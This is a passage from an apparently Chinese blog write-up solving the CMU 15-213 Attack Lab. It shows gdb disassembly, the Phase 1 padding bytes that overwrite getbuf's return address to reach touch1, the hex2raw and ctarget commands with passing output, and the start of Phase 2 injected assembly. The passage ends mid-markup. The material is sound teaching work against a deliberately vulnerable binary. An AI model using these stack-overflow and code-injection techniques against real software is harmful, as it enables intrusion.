&#x3C;+12>:    mov    $0x1,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017b9 &#x3C;+17>:    add    $0x28,%rsp</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017bd &#x3C;+21>:    ret</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span style=--0:#e1e4e8>End of assembler dump.</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="(gdb) disass getbufDump of assembler code for function getbuf:   0x00000000004017a8 <+0>:     sub    $0x28,%rsp   0x00000000004017ac <+4>:     mov    %rsp,%rdi   0x00000000004017af <+7>:     call   0x401a40 <Gets>   0x00000000004017b4 <+12>:    mov    $0x1,%eax   0x00000000004017b9 <+17>:    add    $0x28,%rsp   0x00000000004017bd <+21>:    retEnd of assembler dump." data-copied=Copied!><div></div></button></div></figure></div><p>非常简单,首先%rsp减去40字节,此时的%rsp作为buf指针传给 <code>Gets()</code>函数,调用 <code>Gets()</code>函数前返回地址设置为0x4017b4. 回顾[[机器级编程III(过程Procedure)#栈帧|栈帧]]的知识,如果我把返回地址覆写为<code>touch1()</code>函数的地址,就能跳转到<code>touch1()</code>函数. 寻找<code>touch1()</code>函数:</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>gdb</span><span style=--0:#E1E4E8>) </span><span style=--0:#B392F0>disass</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch1</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Dump</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>code</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>function</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch1:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017c0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+0>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>sub</span><span style=--0:#E1E4E8>    $0x8</span><span style=--0:#9ECBFF>,%rsp</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017c4</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+4>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0x1</span><span style=--0:#9ECBFF>,0x202d0e</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rip</span><span style=--0:#E1E4E8>)        </span><span style=--0:#99A0A6># 0x6044dc &#x3C;vlevel></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017ce</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+14>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x4030c5</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017d3</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+19>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x400cc0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;puts@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017d8</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+24>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017dd</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+29>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x401c8d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;validate></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017e2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+34>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x0</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004017e7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+39>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x400e40</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;exit@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span style=--0:#B392F0>End</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>dump.</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="(gdb) disass touch1Dump of assembler code for function touch1:   0x00000000004017c0 <+0>:     sub    $0x8,%rsp   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi   0x00000000004017d3 <+19>:    call   0x400cc0 <puts@plt>   0x00000000004017d8 <+24>:    mov    $0x1,%edi   0x00000000004017dd <+29>:    call   0x401c8d <validate>   0x00000000004017e2 <+34>:    mov    $0x0,%edi   0x00000000004017e7 <+39>:    call   0x400e40 <exit@plt>End of assembler dump." data-copied=Copied!><div></div></button></div></figure></div><p>填充的字节应为:</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>/* Phase1 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff /* %rsp~%rsp+7 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff /* %rsp+8~%rsp+15 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff /* %rsp+16~%rsp+23 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff /* %rsp+24~%rsp+31 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff /* %rsp+32~%rsp+39 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span style=--0:#e1e4e8>c0 17 40                /* 0x4017c0 */</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="/* Phase1 */ff ff ff ff ff ff ff ff /* %rsp~%rsp+7 */ff ff ff ff ff ff ff ff /* %rsp+8~%rsp+15 */ff ff ff ff ff ff ff ff /* %rsp+16~%rsp+23 */ff ff ff ff ff ff ff ff /* %rsp+24~%rsp+31 */ff ff ff ff ff ff ff ff /* %rsp+32~%rsp+39 */c0 17 40                /* 0x4017c0 */" data-copied=Copied!><div></div></button></div></figure></div><p>构造好后</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>./hex2raw</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>&#x3C;</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase1</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>></span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase1-raw</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="./hex2raw < Phase1 > Phase1-raw" data-copied=Copied!><div></div></button></div></figure></div><p>执行</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>./ctarget</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-qi</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase1-raw</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="./ctarget -qi Phase1-raw" data-copied=Copied!><div></div></button></div></figure></div><p>成功了!</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>Cookie:</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>0x59b997fa</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Touch1!:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>You</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>called</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch1</span><span style=--0:#E1E4E8>()</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#B392F0>Valid</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>solution</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>level</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>1</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>with</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>target</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ctarget</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#B392F0>PASS:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Would</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>have</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>posted</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>the</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>following:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>user</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>id</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>bovik</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>course</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>15213-f15</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>lab</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>attacklab</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>result</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>1:PASS:0xffffffff:ctarget:1:FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>C0</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>17</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="Cookie: 0x59b997faTouch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following:        user id bovik        course  15213-f15        lab     attacklab        result  1:PASS:0xffffffff:ctarget:1:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF C0 17 40" data-copied=Copied!><div></div></button></div></figure></div><h2 id=phase-2>Phase 2</h2><p>这个问题不仅需要跳转到 <code>touch2()</code>函数,还需要修改%rdi寄存器的值传入我的cookie.</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=c><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#F97583>void</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>touch2</span><span style=--0:#E1E4E8>(</span><span style=--0:#F97583>unsigned</span><span style=--0:#E1E4E8> </span><span style=--0:#FFAB70>val</span><span style=--0:#E1E4E8>){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>vlevel </span><span style=--0:#F97583>=</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>2</span><span style=--0:#E1E4E8>;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>if</span><span style=--0:#E1E4E8>(val</span><span style=--0:#F97583>==</span><span style=--0:#E1E4E8>cookie){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>printf</span><span style=--0:#E1E4E8>(</span><span style=--0:#9ECBFF>"Touch2!: You called touch2(0x</span><span style=--0:#79B8FF>%.8x</span><span style=--0:#9ECBFF>)</span><span style=--0:#79B8FF>\n</span><span style=--0:#9ECBFF>"</span><span style=--0:#E1E4E8>, val);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>validate</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>2</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>}</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>else</span><span style=--0:#E1E4E8> {</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>printf</span><span style=--0:#E1E4E8>(</span><span style=--0:#9ECBFF>"Misfire: You called touch2(0x</span><span style=--0:#79B8FF>%.8x</span><span style=--0:#9ECBFF>)</span><span style=--0:#79B8FF>\n</span><span style=--0:#9ECBFF>"</span><span style=--0:#E1E4E8>, val);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>fail</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>2</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>}</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>exit</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>0</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>12</div></div><div class=code><span style=--0:#E1E4E8>}</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="void touch2(unsigned val){  vlevel = 2;  if(val==cookie){    printf(&#x22;Touch2!: You called touch2(0x%.8x)\n&#x22;, val);    validate(2);  }  else {    printf(&#x22;Misfire: You called touch2(0x%.8x)\n&#x22;, val);    fail(2);  }  exit(0);}" data-copied=Copied!><div></div></button></div></figure></div><p>Handout提示我,这个问题需要注入代码.上课视频提到过本次lab没有使用栈随机化,这也是注入代码的前提.经过gdb调试,我发现在执行 <code>Gets()</code>函数前%rsp总是等于0x5561dc78,验证了这一点. <img decoding=async fetchpriority=auto height=1826 loading=lazy src=/_astro/Pasted%20image%2020250124224542.oEvPY5md_iJllN.webp width=3072> 来看 <code>touch2()</code>函数汇编代码</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>(gdb) disassemble touch2</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>Dump of assembler code for function touch2:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017ec &#x3C;+0>:     sub    $0x8,%rsp</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017f0 &#x3C;+4>:     mov    %edi,%edx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017f2 &#x3C;+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc &#x3C;vlevel></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x00000000004017fc &#x3C;+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 &#x3C;cookie></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401802 &#x3C;+22>:    jne    0x401824 &#x3C;touch2+56></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401804 &#x3C;+24>:    mov    $0x4030e8,%esi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401809 &#x3C;+29>:    mov    $0x1,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x000000000040180e &#x3C;+34>:    mov    $0x0,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401813 &#x3C;+39>:    call   0x400df0 &#x3C;__printf_chk@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>12</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401818 &#x3C;+44>:    mov    $0x2,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>13</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x000000000040181d &#x3C;+49>:    call   0x401c8d &#x3C;validate></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>14</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401822 &#x3C;+54>:    jmp    0x401842 &#x3C;touch2+86></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>15</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401824 &#x3C;+56>:    mov    $0x403110,%esi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>16</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401829 &#x3C;+61>:    mov    $0x1,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>17</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x000000000040182e &#x3C;+66>:    mov    $0x0,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>18</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401833 &#x3C;+71>:    call   0x400df0 &#x3C;__printf_chk@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>19</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401838 &#x3C;+76>:    mov    $0x2,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>20</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x000000000040183d &#x3C;+81>:    call   0x401d4f &#x3C;fail></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>21</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401842 &#x3C;+86>:    mov    $0x0,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>22</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>   </span></span><span style=--0:#e1e4e8>0x0000000000401847 &#x3C;+91>:    call   0x400e40 &#x3C;exit@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>23</div></div><div class=code><span style=--0:#e1e4e8>End of assembler dump.</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="(gdb) disassemble touch2Dump of assembler code for function touch2:   0x00000000004017ec <+0>:     sub    $0x8,%rsp   0x00000000004017f0 <+4>:     mov    %edi,%edx   0x00000000004017f2 <+6>:     movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>   0x00000000004017fc <+16>:    cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>   0x0000000000401802 <+22>:    jne    0x401824 <touch2+56>   0x0000000000401804 <+24>:    mov    $0x4030e8,%esi   0x0000000000401809 <+29>:    mov    $0x1,%edi   0x000000000040180e <+34>:    mov    $0x0,%eax   0x0000000000401813 <+39>:    call   0x400df0 <__printf_chk@plt>   0x0000000000401818 <+44>:    mov    $0x2,%edi   0x000000000040181d <+49>:    call   0x401c8d <validate>   0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>   0x0000000000401824 <+56>:    mov    $0x403110,%esi   0x0000000000401829 <+61>:    mov    $0x1,%edi   0x000000000040182e <+66>:    mov    $0x0,%eax   0x0000000000401833 <+71>:    call   0x400df0 <__printf_chk@plt>   0x0000000000401838 <+76>:    mov    $0x2,%edi   0x000000000040183d <+81>:    call   0x401d4f <fail>   0x0000000000401842 <+86>:    mov    $0x0,%edi   0x0000000000401847 <+91>:    call   0x400e40 <exit@plt>End of assembler dump." data-copied=Copied!><div></div></button></div></figure></div><p>构造注入的代码,首先需要覆写返回地址,使其跳转到我注入代码的地址处.</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>mov    $0x59b997fa, %edi       # 传入参数:我的cookie</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>mov    $0x4017ec,%r8</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent><span style=--0:#e1e4e8>  </span></span><span style=--0:#e1e4e8>call   *%r8                    # 跳转到touch2函数(不能用call 0x4017ec,会跳转到相对地址)</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="  mov    $0x59b997fa, %edi       # 传入参数:我的cookie  mov    $0x4017ec,%r8  call   *%r8                    # 跳转到touch2函数(不能用call 0x4017ec,会跳转到相对地址)" data-copied=Copied!><div></div></button></div></figure></div><p>把这个代码保存为Phase2.s. 获取以上代码的机器指令</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>gcc</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2.s</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>objdump</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2.o</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>></span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2.d</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="gcc -c Phase2.sobjdump -d Phase2.o > Phase2.d" data-copied=Copied!><div></div></button></div></figure></div><p>看看Phase2.d的输出:</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div 